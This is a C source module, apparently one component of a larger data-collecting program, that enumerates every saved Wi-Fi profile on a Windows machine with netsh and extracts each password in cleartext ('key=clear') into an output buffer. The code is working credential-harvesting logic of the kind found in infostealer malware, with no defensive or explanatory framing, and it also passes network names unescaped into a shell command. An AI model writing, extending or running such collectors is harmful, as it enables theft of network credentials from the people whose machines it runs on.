// chunk: collectors/wifi_passwords
// depends: core/emit_buffer, core/run_cmd
// provides: collect_wifi

#ifndef CHUNK_WIFI_PASSWORDS
#define CHUNK_WIFI_PASSWORDS

static void collect_wifi(void) {
    emitf("=== WIFI PASSWORDS ===\r\n");
    char raw[8192] = {0};
    DWORD raw_len = 0;
    run_cmd("cmd /c netsh wlan show profiles", raw, sizeof(raw), &raw_len);
    if (raw_len == 0) { emitf("(no wlan service)\r\n\r\n"); return; }

    char *line = raw;
    while (*line) {
        char *eol = strchr(line, '\n');
        if (!eol) eol = line + strlen(line);
        char *colon = strstr(line, ": ");
        if (colon && (strstr(line, "All User Profile") || strstr(line, "Profile"))) {
            char *ns = colon + 2;
            while (*ns == ' ') ns++;
            int nl = (int)(eol - ns);
            while (nl > 0 && (ns[nl-1] == '\r' || ns[nl-1] == '\n' || ns[nl-1] == ' ')) nl--;
            if (nl > 0 && nl < 200) {
                char ssid[256] = {0};
                strncpy(ssid, ns, nl);
                char cmd2[512];
                snprintf(cmd2, sizeof(cmd2), "cmd /c netsh wlan show profile name=\"%s\" key=clear", ssid);
                char prof[4096] = {0};
                DWORD pl = 0;
                run_cmd(cmd2, prof, sizeof(prof), &pl);
                char *kc = strstr(prof, "Key Content");
                if (!kc) kc = strstr(prof, "key content");
                if (kc) {
                    char *kv = strchr(kc, ':');
                    if (kv) {
                        kv++; while (*kv == ' ') kv++;
                        char *ke = strchr(kv, '\r');
                        if (!ke) ke = strchr(kv, '\n');
                        int kl = ke ? (int)(ke - kv) : (int)strlen(kv);
                        emitf("SSID: %s  Key: %.*s\r\n", ssid, kl, kv);
                    }
                } else {
                    emitf("SSID: %s  Key: (open)\r\n", ssid);
                }
            }
        }
        if (*eol) line = eol + 1; else break;
    }
    emitf("\r\n");
}

#endif
